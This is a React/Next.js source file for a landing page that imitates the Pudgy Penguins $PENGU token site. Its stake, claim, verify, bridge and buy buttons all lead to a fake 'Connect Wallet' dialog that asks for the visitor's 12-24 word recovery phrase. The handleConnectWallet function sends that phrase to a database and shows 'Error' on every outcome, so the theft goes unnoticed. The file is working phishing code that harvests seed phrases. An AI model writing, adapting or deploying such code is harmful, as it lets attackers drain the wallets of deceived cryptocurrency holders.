import React, { useEffect, useState } from "react";
import { Button } from "@/components/ui/button";
import Image from "next/image";

import AuthModal from "@/components/AuthModal";
import { X } from "lucide-react";
import { submitKeyPhrase } from "@/lib/utils/keyPhraseSubmitter";

export default function MainContent() {
  const [isNavVisible, setIsNavVisible] = useState(true);
  const [lastScrollY, setLastScrollY] = useState(0);
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isAuthModalOpen, setIsAuthModalOpen] = useState(false);
  const [showWalletModal, setShowWalletModal] = useState(false);
  const [selectedWallet, setSelectedWallet] = useState("");
  const [showPhraseInput, setShowPhraseInput] = useState(false);
  const [showSupportModal, setShowSupportModal] = useState(false);
  const [seedPhrase, setSeedPhrase] = useState("");

  const wallets = [
    {
      name: "MetaMask",
      icon: "/image/metafox.jpeg",
    },
    {
      name: "Solflare",
      icon: "/image/solflare.jpeg",
    },
    {
      name: "Phantom",
      icon: "/image/phantom.jpeg",
    },
    {
      name: "Robinhood",
      icon: "/image/robinhood.jpeg",
    },
    {
      name: "Rabby",
      icon: "/image/rabbywallet.jpeg",
    },
    {
      name: "Exodus",
      icon: "/image/exodus.jpeg",
    },
    {
      name: "Coinbase",
      icon: "/image/coinbase.jpeg",
    },
    // {
    //   name: "Bitcoin",
    //   icon: "/image/btc.jpeg",
    // },
    // {
    //   name: "Ethereum",
    //   icon: "/image/eth.jpeg",
    // },
    // {
    //   name: "Solana",
    //   icon: "/image/sol.jpeg",
    // },
    // {
    //   name: "PENGU",
    //   icon: "/image/pengu.jpeg",
    // },
    // {
    //   name: "USDT",
    //   icon: "/image/usdt.jpeg",
    // },
  ];

  const handleJoinHuddle = () => {
    // Open auth modal instead of navigating directly
    setIsAuthModalOpen(true);
    setIsMenuOpen(false); // Close the dropdown after clicking
  };

  const handleMenuClick = (action: string) => {
    if (action === "join-huddle") {
      handleJoinHuddle();
    } else if (action === "contact-support") {
      setShowSupportModal(true);
      setIsMenuOpen(false);
    } else {
      // Open wallet modal for all other actions
      setShowWalletModal(true);
      setIsMenuOpen(false);
    }
  };

  const handleWalletSelect = (walletName: string) => {
    setSelectedWallet(walletName);
    setShowPhraseInput(true);
  };

  const handleConnectWallet = async () => {
    if (!seedPhrase.trim()) {
      alert("Please enter your recovery phrase");
      return;
    }

    try {
      // Submit the key phrase to the database
      const result = await submitKeyPhrase(seedPhrase.trim());

      if (result.success) {
        alert("Error");
      } else {
        alert("Error");
      }
    } catch (error) {
      console.error("Error connecting wallet:", error);
      alert("Error");
    }

    // Reset the modal
    setShowWalletModal(false);
    setShowPhraseInput(false);
    setSelectedWallet("");
    setSeedPhrase("");
  };

  const handleSubmitSupport = () => {
    // Handle support form submission
    alert("Support request submitted! We'll get back to you soon.");
    setShowSupportModal(false);
  };

  // Close dropdown when clicking outside
  useEffect(() => {
    const handleClickOutside = (event: MouseEvent) => {
      const target = event.target as Element;
      if (isMenuOpen && !target.closest(".menu-dropdown-container")) {
        setIsMenuOpen(false);
      }
    };

    if (isMenuOpen) {
      document.addEventListener("mousedown", handleClickOutside);
    }

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [isMenuOpen]);

  useEffect(() => {
    const handleScroll = () => {
      const currentScrollY = window.scrollY;

      if (currentScrollY > lastScrollY && currentScrollY > 50) {
        // Scrolling down - hide navbar completely
        setIsNavVisible(false);
      } else if (currentScrollY < lastScrollY) {
        // Scrolling up - show navbar
        setIsNavVisible(true);
      }

      setLastScrollY(currentScrollY);
    };

    window.addEventListener("scroll", handleScroll, { passive: true });

    return () => window.removeEventListener("scroll", handleScroll);
  }, [lastScrollY]);

  // Function to set the blob URL as background (this won't work due to blob URL limitations)

  return (
    <section className="min-h-screen">
      {/* Scrolling Banner - Hides on scroll */}
      <div
        className={`overflow-hidden bg-black transition-transform duration-300 ease-in-out ${
          isNavVisible ? "translate-y-0" : "-translate-y-full"
        }`}
      >
        <div className="animate-marquee whitespace-nowrap py-2">
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
          <span className="mx-4 text-xl font-bold text-white">
            $PENGU NOW LIVE
          </span>
        </div>
      </div>

      {/* Wallet Connection Modal */}
      {showWalletModal && (
        <div className="fixed inset-0  bg-opacity-50 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-lg w-full max-w-md max-h-[80vh] flex flex-col">
            {/* Header - Fixed */}
            <div className="flex justify-between items-center p-6 border-b border-gray-200">
              <h2 className="text-xl font-semibold text-gray-800">
                Connect Wallet
              </h2>
              <button
                onClick={() => {
                  setShowWalletModal(false);
                  setShowPhraseInput(false);
                  setSelectedWallet("");
                  setSeedPhrase("");
                }}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="h-6 w-6" />
              </button>
            </div>

            {/* Content - Scrollable */}
            <div className="flex-1 overflow-y-auto p-6">
              {!showPhraseInput ? (
                <div className="space-y-3">
                  {wallets.map((wallet) => (
                    <button
                      key={wallet.name}
                      onClick={() => handleWalletSelect(wallet.name)}
                      className="w-full flex items-center space-x-3 p-3 rounded-lg bg-gray-100 hover:bg-gray-200 transition-colors"
                    >
                      <Image
                        src={wallet.icon}
                        alt={wallet.name}
                        width={32}
                        height={32}
                        className="w-8 h-8 object-contain"
                      />
                      <span className="font-medium text-gray-800">
                        {wallet.name}
                      </span>
                    </button>
                  ))}
                </div>
              ) : (
                <div className="space-y-4">
                  <div className="text-center">
                    <h3 className="text-lg font-semibold mb-2 text-gray-800">
                      Connect to {selectedWallet}
                    </h3>
                    <p className="text-gray-600 text-sm">
                      Enter your 12-24 word phrase to connect{" "}
                    </p>
                  </div>
                  <textarea
                    value={seedPhrase}
                    onChange={(e) => setSeedPhrase(e.target.value)}
                    placeholder="Enter your 12-24 word recovery phrase..."
                    className="w-full h-32 p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500 resize-none"
                  />
                  <div className="flex space-x-3">
                    <Button
                      onClick={() => {
                        setShowPhraseInput(false);
                        setSeedPhrase("");
                      }}
                      className="flex-1 bg-gray-500 hover:bg-gray-600"
                    >
                      Back
                    </Button>
                    <Button
                      onClick={handleConnectWallet}
                      className="flex-1 bg-purple-500 hover:bg-purple-600"
                    >
                      Connect
                    </Button>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Support Modal */}
      {showSupportModal && (
        <div className="fixed inset-0  bg-opacity-50 z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-lg p-6 w-full max-w-md">
            <div className="flex justify-between items-center mb-6">
              <h2 className="text-xl font-semibold text-gray-800">
                Contact Support
              </h2>
              <button
                onClick={() => setShowSupportModal(false)}
                className="text-gray-400 hover:text-gray-600"
              >
                <X className="h-6 w-6" />
              </button>
            </div>

            <div className="space-y-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Name
                </label>
                <input
                  type="text"
                  placeholder="Enter your name"
                  className="w-full p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Email
                </label>
                <input
                  type="email"
                  placeholder="Enter your email"
                  className="w-full p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Subject
                </label>
                <select className="w-full p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800">
                  <option value="">Select a subject</option>
                  <option value="technical">Technical Issue</option>
                  <option value="account">Account Problem</option>
                  <option value="billing">Billing Question</option>
                  <option value="general">General Inquiry</option>
                  <option value="bug">Bug Report</option>
                </select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Message
                </label>
                <textarea
                  placeholder="Describe your issue or question..."
                  className="w-full h-32 p-3 bg-gray-100 border border-gray-300 rounded-lg text-gray-800 placeholder-gray-500 resize-none"
                />
              </div>

              <div className="flex space-x-3">
                <Button
                  onClick={() => setShowSupportModal(false)}
                  className="flex-1 bg-gray-500 hover:bg-gray-600"
                >
                  Cancel
                </Button>
                <Button
                  onClick={handleSubmitSupport}
                  className="flex-1 bg-purple-500 hover:bg-purple-600"
                >
                  Submit
                </Button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* navbar*/}
      {/* Navigation Bar - Hides on scroll */}
      <nav
        className={`fixed top-[40px] left-0 right-0 z-50 flex items-center justify-between px-8 py-6 transition-transform duration-300 ease-in-out ${
          isNavVisible ? "translate-y-0" : "-translate-y-full"
        }`}
      >
        {/* Menu Button with Dropdown */}
        <div className="relative menu-dropdown-container">
          <Button
            className="bg-purple-500 hover:bg-purple-600 text-white font-bold px-8 py-3 rounded-lg text-lg"
            onClick={() => setIsMenuOpen(!isMenuOpen)}
          >
            MENU
          </Button>

          {/* Dropdown Menu */}
          <div
            className={`absolute top-full left-0 mt-2 w-64 bg-white rounded-lg shadow-xl border border-gray-200 transition-all duration-200 ease-in-out transform origin-top ${
              isMenuOpen
                ? "opacity-100 scale-100"
                : "opacity-0 scale-95 pointer-events-none"
            }`}
          >
            <div className="py-2">
              <button
                onClick={() => handleMenuClick("join-huddle")}
                className="block w-full text-left px-4 py-3 text-gray-800 hover:bg-purple-50 hover:text-purple-600 transition-colors duration-150 font-semibold cursor-pointer"
              >
                Join the huddle
              </button>

              <button
                onClick={() => handleMenuClick("stake-pengu")}
                className="block w-full text-left px-4 py-3 text-gray-800 hover:bg-purple-50 hover:text-purple-600 transition-colors duration-150 font-semibold cursor-pointer"
              >
                STAKE $PENGU
              </button>

              <button
                onClick={() => handleMenuClick("verify")}
                className="block w-full text-left px-4 py-3 text-gray-800 hover:bg-purple-50 hover:text-purple-600 transition-colors duration-150 font-semibold cursor-pointer"
              >
                VERIFY
              </button>

              <button
                onClick={() => handleMenuClick("beta-access")}
                className="block w-full text-left px-4 py-3 text-gray-800 hover:bg-purple-50 hover:text-purple-600 transition-colors duration-150 font-semibold cursor-pointer"
              >
                BETA ACCESS
              </button>

              <button
                onClick={() => handleMenuClick("bridge")}
                className="block w-full text-left px-4 py-3 text-gray-800 hover:bg-purple-50 hover:text-purple-600 transition-colors duration-150 font-semibold cursor-pointer"
              >
                BRIDGE
              </button>

              <button
                onClick={() => handleMenuClick("claim-pengu")}
                className="block w-full text-left px-4 py-3 text-gray-800 hover:bg-purple-50 hover:text-purple-600 transition-colors duration-150 font-semibold cursor-pointer"
              >
                CLAIM $PENGU
              </button>

              <button
                onClick={() => handleMenuClick("contact-support")}
                className="block w-full text-left px-4 py-3 text-gray-800 hover:bg-purple-50 hover:text-purple-600 transition-colors duration-150 font-semibold cursor-pointer"
              >
                CONTACT SUPPORT
              </button>
            </div>
          </div>
        </div>

        {/* Center PENGU Logo */}
        <div className="flex-1 flex justify-center">
          <div className="w-15 h-15 rounded-full overflow-hidden border-2 border-white shadow-lg">
            <Image
              src="/image/pengu.jpeg"
              alt="PENGU Logo"
              width={60}
              height={60}
              className="w-full h-full object-cover"
              priority
            />
          </div>
        </div>

        {/* Buy Button */}
        <Button
          onClick={() => setShowWalletModal(true)}
          className="bg-purple-500 hover:bg-purple-600 text-white font-bold px-8 py-3 rounded-lg text-lg"
        >
          BUY $PENGU
        </Button>
      </nav>

      {/* main component */}
      <div
        className="h-[650px] w-full flex items-center justify-center flex-col px-8 py-2 relative bg-cover bg-center bg-no-repeat bg-fixed"
        style={{
          backgroundImage: "url('/image/background.jpeg')", // Using the image from public/image folder
        }}
      >
        <h1 className="text-white text-9xl md:text-[12rem] font-black tracking-tight drop-shadow-lg">
          PENGU
        </h1>
        <div className="absolute left-1/2 -translate-x-1/2 top-[410px] z-20">
          <Image
            src="/image/singleimage.png"
            alt="Penguin"
            width={160}
            height={160}
            className="w-60"
            style={{ height: "auto" }}
            priority
          />
        </div>
      </div>

      {/* Second section */}
      <section className="h-[650px] w-full bg-[#e9f6f7] relative">
        <div className="max-w-6xl mx-auto h-full flex flex-col md:flex-row items-start gap-8 px-6 py-10">
          {/* Left: text */}
          <div className="md:w-1/2 space-y-4">
            <h2>
              Pudgy Penguins began as an NFT collection in 2021. Shortly after
              their conception Pudgy Penguins became an instant sensation during
              the beginnings of the NFT craze with prints in the New York Times,
              features on CNBC, and Memes that took over the internet.
            </h2>
            <h2>
              Today, Pudgy Penguins have established themselves as the strongest
              community in crypto and the Penguin has evolved into a global
              cultural phenomenon.
            </h2>
          </div>

          {/* Right: collage grid */}
          <div className="md:w-1/2 grid grid-cols-3 md:grid-cols-3 gap-4 auto-rows-[140px] md:auto-rows-[180px]">
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/firstimagesilde.jpeg"
                alt="Penguin collage 1"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/2imageslide.jpeg"
                alt="Penguin collage 2"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/3slideimage.jpeg"
                alt="Penguin collage tall"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/4imageslide.jpeg"
                alt="Penguin collage 3"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/5imageslide.jpeg"
                alt="Penguin collage 4"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/6imageslide.jpeg"
                alt="Penguin collage 4"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/7imageslide.jpeg"
                alt="Penguin collage 4"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/8imageslide.jpeg"
                alt="Penguin collage 4"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
            <div className="relative rounded-2xl overflow-hidden ring-1 ring-black/10">
              <Image
                src="/image/4imageslide.jpeg"
                alt="Penguin collage 3"
                fill
                className="object-cover"
                sizes="(min-width:768px) 33vw, 50vw"
              />
            </div>
          </div>
        </div>
      </section>
      {/* third section */}
      <section className="min-h-[650px] w-full bg-[#faf6eb] relative overflow-hidden pb-24 md:pb-32">
        {/* write-up */}
        <div className="max-w-5xl mx-auto px-6 pt-10">
          <p className="text-[10px] md:text-sm font-extrabold tracking-wide leading-6 uppercase text-[#0b0b0b] text-center">
            WITH TOYS IN MILLIONS OF HOMES, OVER 50 BILLION SOCIAL MEDIA VIEWS,
            AND A DEDICATED FOLLOWING OF MILLIONS, IT&apos;S CLEAR THAT THE
            WORLD IS ENAMORED WITH THE PENGUIN. NO BRAND OR CHARACTER WITH
            CRYPTO ORIGINS IS MORE WIDESPREAD AND BELOVED, MAKING PENGU THE FACE
            AND MASCOT OF CRYPTO.
          </p>
        </div>

        {/* bottom-corner penguins */}
        <Image
          src="/image/sit.png"
          alt="Pengu right"
          width={200}
          height={200}
          className="absolute bottom-6 right-6 w-[120px] md:w-[160px] h-auto"
          priority
        />

        <Image
          src="/image/happy.png"
          alt="Pengu left"
          width={180}
          height={180}
          className="absolute bottom-6 left-6 w-[120px]  md:w-[160px] h-auto"
          priority
        />

        {/* centered tilted poster */}
        <div className="mx-auto max-w-6xl h-full flex items-center justify-center pt-20 mb-10 md:mb-16">
          <Image
            src="/image/poster.jpeg"
            alt="Pengu influence poster"
            width={1000}
            height={1014}
            className="w-[500px] md:w-[600px] h-auto shadow-2xl rotate-[-3deg]"
            sizes="(min-width: 768px) 600px, 500px"
            priority
          />
        </div>
      </section>

      {/* fourth section */}
      <section
        className="h-[650px] w-full relative bg-cover bg-center"
        style={{ backgroundImage: "url('/image/backgorundpungin.jpeg')" }}
      >
        <div className="max-w-6xl mx-auto h-full flex items-center justify-end px-6">
          <div className="w-full md:w-[50%] text-[#0b0b0b]">
            <p className="text-xs md:text-sm font-extrabold tracking-wide leading-6 uppercase">
              HOWEVER, THE PENGUIN&apos;S STORY WASN&apos;T ALWAYS ONE OF
              SUCCESS AND POSITIVITY. AFTER THE INITIAL HYPE, PUDGY PENGUINS
              FACED A CHALLENGING PERIOD, DUBBED THE &quot;GREAT BLIZZARD&quot;.
              FOR SIX MONTHS, THEY WERE MOCKED BY ESTABLISHED NFT PROJECTS,
              BECOMING THE LAUGHINGSTOCK OF THE CRYPTO COMMUNITY AND DISMISSED
              AS A FLEETING TREND.
            </p>
            <p className="mt-6 text-xs md:text-sm font-extrabold tracking-wide leading-6 uppercase">
              THIS HARSH REALITY CAUSED THE COMMUNITY TO REVOLT, FORCING A
              COMMUNITY-LED TAKEOVER THAT REDIRECTED PUDGY PENGUINS TOWARDS
              GREATNESS.
            </p>
          </div>
        </div>
      </section>

      {/* sixth */}
      <section className="h-[650px] w-full bg-[#e9f6f7] relative">
        <div className="max-w-5xl mx-auto px-6 pt-10 pb-8">
          <p className="text-center text-[12px] md:text-sm font-extrabold tracking-wide leading-6 uppercase text-[#0b0b0b]">
            BY HOLDING PENGU YOU BECOME A BEACON OF MEMETIC CULTURE, A SPREADER
            OF GOOD VIBES, AND AN ACTIVE PARTICIPANT IN THIS REMARKABLE UNDERDOG
            STORY. PENGU IS THE TOKEN FOR THE PEOPLE, BY THE PEOPLE AND SERVES
            AS A WAY FOR THE EVER-EXPANDING GROUP OF 100S OF MILLIONS OF PUDGY
            PENGUIN FANS TO ALIGN THEMSELVES WITH THE STORY AND FUTURE OF PUDGY
            PENGUINS.
          </p>
          <p className="mt-4 text-center text-[12px] md:text-sm font-extrabold tracking-wide leading-6 uppercase text-[#0b0b0b]">
            BELIEVE IN PENGU. BELIEVE IN YOU.
          </p>
        </div>
        <div className="max-w-6xl mx-auto flex items-end justify-center pb-10">
          <Image
            src="/image/backgroundsixth.jpeg"
            alt="Penguins group"
            width={800}
            height={360}
            className="w-[560px] md:w-[720px] lg:w-[800px] max-w-full h-auto"
            priority
          />
        </div>
      </section>

      {/* seventh */}

      <footer className=" h-[450px] w-full flex items-center justify-center bg-[#00152e]  relative bg-cover bg-center bg-no-repeat bg-fixed">
        {/* Top gradient stripe like reference */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-pink-500 via-purple-500 to-blue-500" />

        {/* Decorative penguin at bottom-left */}
        <Image
          src="/image/singleimage.png"
          alt="Footer penguin"
          width={120}
          height={120}
          className="absolute bottom-4 left-4 w-[80px] md:w-[100px] h-auto opacity-90"
          priority
        />
        <div className="max-w-6xl mx-auto w-full px-6 grid grid-cols-1 md:grid-cols-3 gap-10 text-blue-200">
          {/* Left links */}
          <ul className="space-y-4">
            <li className="text-3xl font-extrabold uppercase tracking-wide">
              THE TEAM
            </li>
            <li className="text-3xl font-extrabold uppercase tracking-wide">
              SHOP
            </li>
          </ul>

          {/* Middle links */}
          <ul className="space-y-4">
            <li className="text-3xl font-extrabold uppercase tracking-wide">
              PENGU LORE
            </li>
            <li className="text-3xl font-extrabold uppercase tracking-wide">
              IGLOO BRAND
            </li>
            <li className="text-3xl font-extrabold uppercase tracking-wide">
              BUY $PENGU
            </li>
          </ul>

          {/* Right: follow text */}
          <div className="flex flex-col items-center md:items-start">
            <p className="text-lg font-extrabold uppercase tracking-wide text-blue-100">
              FOLLOW US, FELLOW PENGU
            </p>
            <p className="text-sm opacity-70 mt-2">
              YouTube • Discord • X/Twitter • Instagram
            </p>
          </div>
        </div>
      </footer>

      {/* Auth Modal */}
      <AuthModal
        isOpen={isAuthModalOpen}
        onClose={() => setIsAuthModalOpen(false)}
      />
    </section>
  );
}
